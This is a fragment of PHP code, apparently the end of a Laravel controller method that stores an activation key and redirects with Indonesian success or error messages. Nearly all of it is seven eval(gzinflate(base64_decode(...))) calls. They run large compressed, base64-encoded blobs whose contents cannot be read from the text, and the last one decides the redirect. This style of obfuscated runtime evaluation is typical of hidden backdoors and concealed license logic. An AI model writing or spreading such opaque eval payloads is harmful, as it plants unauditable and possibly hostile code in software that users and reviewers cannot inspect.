        eval(gzinflate(base64_decode("DZNHEqPYAgTvMqvuYIGwgvgxCxDeCw+bCeA9nPBenP7rBllVWfDIuj/V3Qxll23wT56tkCb/A7AYAfzzjwBUQpytjKsEbkevcarac1kS/K1yp7g/ay9PTgFBQGU5R3tvG9RzdkCm6Vo0B6DV4N2lGjjMkghkyJgMqhqCCt7ylPCoW0yWGODDlROzpJYYPZkL50w3Pnf79Ebu0eBzRMItZeYLpRkSHp/MGtWCVb+NWNG41bA41cXFFPcaZxhCFkGTdk+HRPTlgdEPZRy4A0KpPJLlm2A5gY+nl97c27/wPQRlo5N7sbxBq+qzRF/pvDR8oxj4aL67hIf6xgm6A4K5joi2OSm2yafQlLVAWFo+ELfAQk4j7vAjbjtzhOPbRoMbo7bVv1ufSrR1sTZcOL9OoZmquW+4u1JNHoTsMDOxdVusYz+RpWgKGWWHz5d+Pyz3wNVujF6hUFHRVifJNkXP+rEBTalfK2uqER8De2aTFYGiZXGoX6HwvX9oSS6htZXt+tna7HJDGzqg/FDKXOXDBCQ42a8HpE/GsJmnzllCqI6RHuatV85bTC9mGHUaoSvIy+hBln9xZnkHKcDck9RQwJeYn49qjNwrtdXt4OEOZCzmXl6sJr/0EWOeYv0UfJ8y61FC/IBwzReQ+pZ2af4dCQ1iAdige8r1+9VoyjS5Dme5xZyMbu2mhuPJ02dUdehlAFjXAJbKmyL/8BwJDYnhDNQiSKf7JUQq9C349RoeRI19olSJmRiOLvZ2Pokz0zpS1C0qObtQiJcRBXsPqVTNQJOhSI07LeIF42LbohJqOd27pZ+QsHnKvZ4cqd49Q3UgCCspp5OWqWe1E3rimcNAiupZErz9IL9tOC7Hl1bsuauGVgGUReNqoluHgOV6dfzU5U3p0zE/C4vdZ/3cnUFb8tdn7S8nlxdX07cM+sN9tTB4Lm8fORKHcc201V7A5RyOFvBcmDcZnbFRmhT1dXUmF4gucUfFgMVh1TaMjUgKXbmRkhD0htFjUjB2sT9QTIzwtmf62b0FPRLoJNtn5gH29mOvBguNkpBizZXpECI0zvqw2w6VlBBAai8izo6iDKJtjMfPuiDl0G8MOXLk/csnDjTq9xRtRyyTaxUCn7p2STD8MnMGzRvbR91Lc7od1Mshq77cglqbVDbKJ9HVPo+Ws37dp5p9Tj5CKBNGFQZ8C2ZaPpUvdFNVY3T+pechR0iTZcYppj4dXQvZF6dVONyLfFXkh4jxxk7gitm6XVYq2/w7FS+z/aEQqQU/Hv4btkhkPOXQe6+8bKfWltFDg87EBOxGi2Nfv7N5LKohjXajWnJjjnePVGO3H1+KUXD2lM79jlrd5P1y4UmGTtJhPeNOx/UUXOejcEbHTTB5l6kKVbzNhRse0ej1TFumpPxALhWqlC5/5w9J/+L1UMqgIISKuOqCR9aypbfz7iRuS93giE13jnOtEwGLHrUvvctxw3kB5N/RZZ3lpvNeqiYuoOIDrlGAiVWSLflrjwdhNIHsUXOvBte3nXjPLHczObqxp2L5TTE1H5/rOPDX5QPNsM3V23BSpEZ0IVeDps/QbDfhA4yWNkhP3TKcZpjbYXUgZA1sZ92EPhnA56dQqtvTRkqqhcfHoQ0vbB2uLOiS4j7M41PLTvH6YoHmSAaVkM7ElYBeSc6O64RSVC/dEgyqYr8XHX79sE3gKkJSvU+PnKRHNoU1YxsBUxhBD8ulRdHDIZ4siqI88+8/f//+/d//AQ==")));
        eval(gzinflate(base64_decode("DdQ3DrTWAkDhvbiyRQFDRpYLwpBzhuaJnO+Q0+rfv4LTfDrVmY1/N28H6jHbq7/zbKtI/H9lVfzK6u+/hFIVv8udsI3AHrC/wCjPRfSlyQ0hKkl4WIDDCNj3qyTZ3sWHAwozIztX4/NWBxJtOhl+lfl88I2G/ePtqBgHQOq5IvuyhVKQHacKwvmmmX/Q9h7O80DygidkJzUtXz5lye42COU+O6MwL9rtJmo+cbRJtu4uwNHoBixQRQGBk7thMagXpcsifhqSZTh/WyygerMsojotm7hN59xudwTCAhk7j162hHhi3oDU6pwMLFEsjebvTOIVBI96Q4CycNkDBT1IXplQEKk+QejBTShNxtPARrz9lzgG9Qx6ruefLjGi60HqKPcU9gdhLm/n9OV9PqJB0adgpG+xL6jKDPYTxWZxu0b7ow74C8qsFO99QOX7chdsF2dJIPYC0MnLEE+DTKoXugp6Yl/JI8Jtgt9xC6A5DofMz/dRKb6GyOcrYxg60UAzSa9K8OI0QIw/kSk/heZdRiyy5A/YkqCt8wFfv00715gUU159oZbJ4c8ywrw0LrxGHl7gSsOW1fjdGUdSE0V8um4KnYzzwoLO2vLKoQwjUB/jRS/GAx57P/XeK5l/DgZF4hvKe7mlKtEbkUGubPbuYp8no82VifptuIwAgfK943ZSvymyp9Bboh+3YBeeI/nWocKYNmoxuNwRiPwPgcUzRkFt4STNFezOfK8xpvigTzQ3mts0N7wetWfoGnQmBdGMC+SIjHw1mxxfe4EG9SFXO23ecnRWYZNMR4pWzi6G+Adn3LFZ72HqRzZxJKesIVzq+RUqS+tAaEGpH5klHx33QaduZ36ojpxgnO+g4ixZo7qxwDdr2D65TXRRnM0JQGTvalF9wQ2syNs5JeKAq/A8/oxhzc38C+8IbruOnKBFnOUoWIl1HIxBWZAQGiC7+Xnvgj4vMnD0iq2kWms9Mbq3gPBtO/DDuypw/52vsfjp3bKFfUob5GOVfH9ZbZeiZqb2Dvd1IKOsu+kl0Bxp/U/Cq1JTqzeu+1xg3d/Y/WOHVyiGmqv1dx3v4PiVLvLEKesRyS3YiQisPDzr8V5CqXnFLpguvaTNvECEfq7axIcNpkTIVI4lR6Y8HQWY/M0JHQ/yB/3AOdNlTD2RAck0KyjG0PNB+C7KC35lgfftN7BLQtX9DPSqY3vyFoWXbFw24SxLyrPgHlZmEtVEpgEWm69x6X1/SF6d91pwENHuhEKjc26fT+oE1+C1bA8xpowNz5ih09WvtHFef8V5NC3VXV7sZlZI05DfFzZSiUQnER2zd1LoNuuNf91xcUoSA+1bWnM/XKxn/0YJEKPW4VDrSZK5XKGQSgycjrTM71PNx26wYuiOAVDvtUuEHCAtxd8mq9yTPY09f54ZtbFo03m+z2fv66tAQvjnJr+Dq2vvLHUvOMjnoUyxWjfTlRv4ft7XVKi+3sJQXEyJ8Wx7G6Cuha7ppc/C89KoZqRh4VkNJZlM3Wgjha3u4ZaWaflK8W25z7BfGLcfBiYmmoULJzKz59Yv+aN2NmCuP2tccWr6rUUTdQ78xiqHCxChmfC8d9onYagx1soq8Qd5iVZzHalQsQIPdUGRWgsyaY2DH0YQkq6AZ94FnmAfh4jEHgLhygH4jQhe/7vZLFzDMASXMMw6//331z///PPv/wE=")));
        eval(gzinflate(base64_decode("DZJFEqRaAgDv8lf9gwX6kJiYBV64FraZAAp3l9NP3yAzI4sz7f9UbzOWfboXf7J0K0jif78in37Fn3+EfMHFxVbYSmBLqp/2q70UVDyvdq9NQzFU6UdkhOPTdnRaB9V49gSjP8xIEma7ExoJnZOF1S3CEicqYZLbviZOg/HapvIDN2AL3BBwrQvXAQujRRudatnqnRMSX2hRLO9uP9HHwvmKkB/oW1J51t/gbkYOVIjNHObNXuQoEOCtEYFboDLGFcntzmA+bI/LpSsnnRimhZmar218l0fXSVO014fWkMoGiQgV0PWthTEzPVbO8ANebNGPRNVs5p7Py9PJEmXSVQ6DncSXndl+h3Rkxr8syNQmMTbdyQXiVhRyAMSPle+33cmZiMHucHRuOKHOxphu9cxKjPEEl1t83zVJ5isblpxmRa6nJ4J4thr9SAcIcyznrixP6V+Z22DxNRLbYuWlVE/oKmceKgbx/sYhcxBVkeZkeRalkrKT/35fmdlnOLeMQNztC5iPwqlvT2JPK1HQidvt8KGQoKSmd4RE8VbxJIRHma1DyR8LQ+qLHiXqjhneMDH33uyO8SLW8JEr4rUKLJLQU4brO8C1OxOY4lHGXlAebyWmIGZsBX/nd/PpwVQG0n1Qg26fREFUu+SGaVUPHz7/ZjU9adpnSPkt0WMvpg04+BOgsxUZ4rmIkkw+MQyJjbta+kFntYkbHoLYh6Kxt3BL3Afk59o8n3pzmhLRgu6Hie45h86n8ySRWdzO/7JBw/GKVc4/e88xJqoT4O2FsvKvWlN58Y3G89FTgI6y0WTYTra4LvT9eX8M/Amvyt604dUqafuKe+jqCwPXgg59j0PmZ0hDjDuYJBSzpfIQABOyS49nucEgNuXzfLiAF2IDi2SQxKx4UZ7Tq2aVyGfeew3MZPGPRH+7T2sHFW+Xyc6+9yIC0HVM2y3Iak+G+g7Ux0+65ss1a0ulYACvBfhzH/r84eKuHAtYGTAdViDL251T2iop9A1D523FG6aizAsktOH2cxTar5hUNLYSIO37ifgENSM98A5iMJutBzvScKnylL9ni5GI99PcUnfZ84V9xZpbCKItilBi1YelIX2E3Kx0UL7t19JACCe7QiOnnGovbmUvejvJ+juR6QkaHW2PMJgTF/04pAlBIiMqnr60aH4k5NOvT5BTf8+k/lo70njvomQ0hMzQFXErEHqRVbgsT0fPHMU73gNI90R/jsamgSM8K8m/YbcB3yIaPTNG5LufWfv2W6yUk4dkO15QWY6yWRrN0QC6RRDlLeIelJ3UeMP0Kdio749Ojikz6xrseJu08vamSX1vYog1q/Rr8XumKS5y6Pli/NtV1tetcJgn3cpM5yf5vPbw0wOyRHvuXrUnBWGukY7P0YV2gn2tgIu5KC2lRPyExBFG0D2wi6vNqzV2AFox4XSECX8ySjrfZLhj9ifuNfO9ZCc9ZjWuXhAvAiZhk2aZ0E3PnTQfGuFeagYfbA02vG8JHPWxgGjVDyTr93xxacijS3OwOL9iMwoo0v9qE4HZKaXPIeuYsmNwxTkdRrECcVJ+9rbu8/iOqMRboif3mhP+Ht2Jmjk+3ViAA9Ub/Cf89HEr5Nn9wvBIMRAMwxX933/+/fff//wf")));
        eval(gzinflate(base64_decode("DdJHEqNIAgDAv8ypJziAhI854UEY4d1lA+8RFFCY12+/IbOC2finebq5HrO9+pNnW0UR/yur4ldWf/4Ry48qrnvCDaILS/83Xp3jy7pl8qP5DFeWimLDP89NQQgJCcyvoUDQaarRvTKRMEf1+JNgFIqGcfBZIbDtFzkNLDp687A4hq3I1JXz9OxNLwXfC/AtwNJsvSFEzlt/s1vTh9IQxv4TSIYYupv77EiYUcR23l3sosKquW/PwRo1dcFjjQIi1duMtcdE1bjd9MmgkbzZXqQZ0ktuoqU/n1/MUC6RNqNFi3r1xglV0wVnqCcmBXBZkaGy1fnwc8Y8VqT2+Sm47s5aYwkvXc9mEVL+HcU9+NpZ1nHRqOBm75TicQpVMYqCH8kYR1tsu4XL4hLdMCwKzCLB616S4jP59ax6Hbq7/FaC2vU9+TIlb1Ky5Xlkvzy7O0YIh3iqFxlitg+mmmz9qwTcoTxBZ4HGoIGVVXBjPG/NmUMIHs9cek8hCcNJtjeTjCAKb5Mg5RRYdL4eLNYRds356JGQfGeG9/ZtJF97XR81rT4uXAAOUaWZQs+2BPweZqnurNdGvn1R0Y7Tnlc0m5MTJt8pXLPO1Vg8/IRj3FrQ+GD1DcRuWnmBM4tg3u55PPuVkeFPo49KLJkTgj5x1TcdVQCzOhnlrOcco1OnXYO4smRLWKhB3zZV7EHOTSWNjmHLEf6cvz4Hzok0Hx5NWb6PrxVcr4UWOXZRSxNeTl5fqIcZnNQFxHLEgYN6ZHU2d08L3RkNc/6BWqSey6erD6qxyqnWZGo3G4y6FSHRuPyG4uXrTA9QTcPynjvC8ZutxS+6S9zjsV9zp54z00zvdUSi8/gIwjL/zYJOhUAy1O4zXT8MmUJT0WUhafbelrmXNg2ieMB8G3CTGSMuL4Bbldt0VYr4sJ1X44ejoQQd+y8m/oY0s3Sv+gvaKetFAss1Ibwob7ef3qSVMDAzv2KleKBR90tdCU830xiLQVgvxERPMeTLLeUVMCTkR2JdrwTQpwh2qUSN47lIN/b+jvEnaJax3gRjUPjXxz08q5keX6iCfsHPVixU8Hr21Mx65yenedAtVbs72PHec4ExJ+Qt03uVzp5ap+RL3fIC79svQQDpE9XlZLwF/BL1Nfk1v73lVDLE+jWQXZx52y9YYmdbVGiomay/9cDUAQa75psHfd2sUqV6jLW1gFTrcoEaA7o0c7Y8tQThtN8pHijCOQDUnLzZMeh6vGROa8VffNREcJmSwqGK6GqjFs68FVd812ZF1cJQf78skz5HstjtaqQWr3eba5hSxJrlaGRwVkql5ndDNppK3xdCx7U/0mBR59524xSymMRlg7ZBXSknTpu/Tbx2bxDp2JupYRqkd21fSMAfU0jHix9leoc7l6yhse0gAkLCkJYdBe2yHsFHeQflGt3L0ryTqlV+pWiHFWzHLqoiPQiGkUzznB9btXz11lE44ZfNBwMXXLrvLiHxfL8oo50si1maJe+edkM8k8Bj4BfZMOf3TmaxiAfE/cLiU6gk4CHRqw3cNvB8dniFbhZySOk/dPAAkCRlu7Xn9UYsRBc5qVTcSaGsS2CqLnvlYKL+ztGZv9sRTz6+Rrn3bVwdd0TAoMWkLz+ouATxGcdRFK1Q9J9///33v/8D")));
        eval(gzinflate(base64_decode("DZNFDuQIAgT/Mqdu+WAmreZgdpmZLiNTmZn9+q0PpEKKyPJM+z/V24zfPt3LP1m6lQT2X1HmU1H++YcvFFFY7pipeOYAvaUgWewQ3JPSlcK4TcyGBWzGgW9Ctcurx+BbnAadtDucUBTyTC4I04no7wn4HWXPC7hQQMQkNG2gJaMNht/e0NTpjFnoHjNHw2PlTeU6KmjhSEyXwCK4pz4arwtcHTkUqSKY5zt023xeqpUYlWMTW1fRqypQjJlJh9HRtJB6j+1ugrIi5tkKFta7iS6obPJM4GHYTfheHKvlr0cQcuA7qTqphEqiWykT4XhiaA31r0hB5GS4dTX0VryVucyTCHM3KyVTc/eG/uTLmLZ4Sm27jr8Y4zGGk7qUd0gkq88No7AyYw+OD1W0zPjlKIOxUhtvohRI8HMA/FTTDNFN8VnuAlfDhWhxT2kd8LJ1PVRbA/CsfHUmi4BZSr4+8qXgSi0tA6o08rHVQxXYsSE6FOxkTfgap+bzOYFHFLLjyEKp3L8uarYWUt+tClgccy3p0kXbE0br+qqwZa8GQh+eVKnXT8xwfFrTDCRYBCfY3GSeKfkr7tJaL3QVWSyVNcjo7eA3RB2CxuV2pV3CoHHUEkXS7FU1W3unLDFlnnvjEMq+uqvDYN+tIuJc5S/8iSHR5dLebYAheWWLRz97A6AT5SKOBdi2d0kiqi9DsRwEPEvW4fYtZxhHEn8hVnmRmgllaqemy7TxS7fyDVYKaHEA02xFmNBVMdIYZUSqm+SE5hurNUpy+Y9vioAIrExRg5j9t2qYQz4WnWmuk2rwML1QoSz2wJ2Dvhhi2t13zmqHo2lD9Fq8aq0TzSL0N8Rf66KQC3RZyo3i76qHJPJoGMbOHn4qULgln2NluqVx84IjPWWXBP40DwX47gx53uCHh95C0Y/2ti+rIa8Wffj2ck/caC18yDL/F8evwM2vJrVqPfELN+ajFXfzlr2Bx5JasaljPrF97BuT6UdJwHorhCfxcd0ELCis6hMisxXsjRfQ+vottnTL4LiyFaK+2mrnhKRDN5nhCRFLLMwdmKPBoFFBhA0y0jAqogDsvb2UwkHITot0Y7OFDMLDcJf3PAT87G2SFWoL4Sf85BKi07otWgY3YeKzWoDeY74BRipcAC42pJDaJwMJsBql4wNTySW0wuuiWFKoPm1LbYOmNKPz9Ua5NTOsv5NNGtKLaE+O4liaS/140haKZOQ+7SMAQNyi+55+Tb8Z+fv4BLTahTwHj9O7Otr5yiFOx+Bd0kyQeHLjCLb7HlyVui7pt3pyqhuAWMNqZRHrPujjSses6eEt6Lr8IA+JaCk9Zopz7Qsa2afioZ/JF875xhCw3lBNK28oP+pAG2QIjRNfCaKwURoscrQxawaiIUTj8M3MmWzVzsgjrvfe8CFOK9sn22ep8Syl2i6yMRQ3gI/W3LrOppYsIHJ7L9SflIA+8wfs8M4ofroy9RsDzrCl0xoKGQFRlkPv9CaVqIoBzGd2kHbTLEa8sPVBD5K0YiLPcogKBszj6eyLauA2W16x5W+ZyV+apJ1g3Pgz3kx3JRbfMCO/A0b5ubjPh9rFCQBCgz4hzWpcuwYHkzFo1DflSa8wQiL0mPmwDgha5wmCAI1S//7z9+/f//0f")));
        eval(gzinflate(base64_decode("DZQ3EqNYAAXvstFMEeBdbYQwwnuBINnCfLz3cPrVCV7QrxscSfenfOqh6JIN/EmTFVDEfznIxhz8+UfITUmcr4grBW6H/TmnBU7/zpIEaCsulXGUa+KGhoG8sNs6bMiHLSxi8QHA4XDrQFMOGl+yZQphnLyQtZL5Czxt+xpen5dwTafy1fRsfNtGANUIOeAMHZjbkJzlntaapV8gkMZtDNUSHwsxoXVVj9fGjKx3M31r5W316zcOK4/mC1KNwjMO8Tg25dQTrUMIpOObK/sZ994LyC9n3DyEdF8267yZoygVa31ervj2TO2GZW44BvXyyL0rcotXYSPaNDnSWwxXC9nEMPI3a+/SM37OwvO/xowEDDzFmjZ8QMqJtMffEFy4M2HkorZMSO9me8wwNcFqauzpUZvV30rb3nsR0AtTofWbMeyAHFFd3+DyXZdZpG4VuU8VA0PNdJ3gCrqBDlmd2Y/YAi3eW7KYStOqNo1W4PfduBwuzZp8yHywHk+7TSjr1QJwXnnhi4yv7tu6qICkRN96OqQHfp9FMlVZsWLTKx/Inha/gjscnDyxnwsN6wh/CSo1xp6/53LVoq2zvW20CPmF6rWayqKXkCx4TA5RaWrRTGUNIS7ns+zFiIxzHO/lBwA6/0A0lVA+xvWma7UmL04N4yorIA4rJIJpEaRbKrJlvZzne5yIXX7HYb5zFnkvBrEoJaLPyoVxVclKjVSOnLBEhKbRvYEiFNGYPiphLO2nR6wl3XGED28WXl8YPm/kdJXulpEsT9RbCPlhlhPK7kDvrg9RZ27pahzZZU7ebEy+BDM74H65Y2HUJI9Lrad/igGWcFm9c8/DV1EJ0X3XiY6RmRzfqmLA0vR78+yTlowrTwmWiIDyu4R0Lh9cw9mdVDyyWibReXnvPO9RRRsPz9HtDxMMx4nVBxlsuFmlFYZgLvLiZueg0flY1PdhxE1mO4PT3K5uZ0wXGgeWp5+Y3Vs3iVS9Dy66jsVg4fqd1W5xjyipW5Tt/JpN1gjlONYG50KkawmanB99XcDMWklQMhqSzCFHXPBaq9FaH1J+Bp2alfuGUssnOQVrjoWM6eM3mvLGrqfpKCMEh7U1DEL2JDGD9L4wUCarJhA6h3YTcdRvSP1YorELy61qCFDg57AIzxb2AUbjBr546tDmCaodeSShpd93sCEi0ZYHKVOqKDBjxxMbwnwGtXLD+ylE6ApO7dLU0kFJ4sHvktMmYEezIFv2a6nz3gpYsZn2jG5rjlNRQLpZlNHgiIUKgzrPdH8uh4Rxfhx0mkCYL1X/UBQvDHg32G7T2fwzqpFO5h8gWni8y/MPoHar7oztE+J27Jcrv0cO7NmY81D21IQ4KYZ5uOMWKxhFPtT6GeeQz060KNCb0RWH4puIsiLcxkEXbcoqmkF2j0uR6x4E9TGxg76nu6jBkaF60fcaBSyliLMzyid3Ubh8Ccst/oLJO9S8oqN+e6tRGZoP2WvRxUv7cMUtkDiB/2LHBwUkAfmdQemEpM3t7EAeal4mjcbhhwlqcEG/nUoCQoKbCxoSeO3Ka4l5kc0x1TdOa8frKK4gqgWiy6slLtUZUsA8WsHrUK+G4frGn4mR/QDq9l195s319btHEyf1Mh8vCNO5oQzrIzO5Z06YPGuAYK0adZVDzhXKcW6LO4K4OQ/0yvQZwlfaQm/yQF0WYR1/E3kj6ZWEfdndWeAhq5WrBxNH0Cp+VxNXCyKioEmWZWEYXuF//v79++//")));

        if(gzinflate(base64_decode("DZNFsqNaAED30qPuYgDBqa4eILlYCH6RyS+c4C5Z/X9bOFIcSfe7+n6Gsku24nearAVN/pcX2ZgXv3+B2AHtbss876HrXMbYExgkNF99OXyer3fi6SiB8AUEsIPDPpw+g26QJ6bwoFoaRi7+4kAfIi92L6yWrsfjaqYaLXkN3OQd+2hjL2toBOr4OYs9p5V1iChOr8RIZT+5z9pWgPnRqwsrYLeItOna2SJO088EefmQ5EWPEipbEAAo5tXWq17tbgnI0zEKBkiEokX0uelyAY4xSRLdmzDDiRQpeMKHVkcZKwAzBe/M8J0evamSsCetpxZPWpaa76wx+mCn+vIdMXRX2m4cjf6aw4StysUYkRx7i8Wez0VdinSV+MHlUB84IHronQutOz+U2dUbrjOqIn06UBB15DRHsgSpzDhYzPTBSB0rs2i+GGAnJqdSid0zL9zhamSCExGYLOZN2Rcl50ZLxvA9oql2rixxsMVKpW3ae/IlzJqLnb3kDTN3z/pyhN1UnOtrddoGGgNERCinUrsyVwENjhXUGXmks1UsshGO6tJVhi9mtZo1bUdJ65DqITsSGj/u2aTPpYmdBOXx3NR6Vd/8c8166XtUyc4MxGsW6dtsLeX4FGH05L0TpT7chdsJu+Spz9gGb4msV7tE9xSGxeLN1w7LSSW48YrrSiUs6sXK9k3B4hG5wQDQ0e+g8K2Qyglh9vXqlIoILuZrxogFtbJKa9WVvc/5hoyAFJ1IahHA9i8iJL8nVdUiaMpBprbzvA7RyVedPjGWOnzLcXILW8r38EnxNfgY0g5DDFDfCBzJ5mS3QlaKRrtj2E0AdXk/zC9eLL4E/fHILbf9t6Hk1JIY0xPDHdMK6U61BBsO6rKrWF7DtMjTrXgi7EOb0OzEdK5B2ZRWWRJmQZtanPkqYhDunJsUjmXSLd8JpSdVrmcZh/NMjfvL3D3+5LsuT105HzxgiI3dbgIkjqV9f4lNP+/6aVUkUUdjc2nkiRk7zigr/rHeXST0AbmxIgLHjIkqcUVN0n3sL7WZry2DQ4lIbbKrGkPWUcez0UzLmQjuttbB1n33AXmZpRVuji0ZeSK8H0r5KYVaBXFxOsOHDRpkmuVB1XGTEBS/vxXqaxkzTfJ89YOT63qEFkO04dcdLmwH+nNSuP3ePcBhOZmDNcuV6IunmXRM8eElzGtopaK4XnVoQepYikskxIb+QHJOVCudNXXVDw4+BCGh3g2fNSnTL1J76vgwXKsV/KR4sZIgOKSIPOQIl16offU0tjnhGV4sbmwp0Y24a4Tug5UultXEmwySmCa2bmBlYTiydIDvotRnMcRKGCXV7NHEbVuqhtt9pJRqMCfJgYgK3YzMB7aHW5vq3J8qgCZK88/dP9J7negyromkdsSOyh7rYI2S7BNKbTzf3N3xCEaeGfv8aLJqgJi+6E1n8EDjoAssf5pptT8rqI8RS5lfSM24d+T95NIB1xwRc6FNQ1jOpVddOLDOw5yMENDCjNPBHKQL+nPl48lfg8hWVR89qqnosHTEiOKIcIF+0yj6Y6KYX2j2NUfQqMwViNQ586pSayXKIGh5WOX579+vP3/+/P0f"))){
            return redirect('/dashboard')->with('success', 'Data key berhasil di simpan');
        }else{
            return redirect('/aktivasi')->with('error', 'Data key gagal untuk di tambah');
        }
    }
}
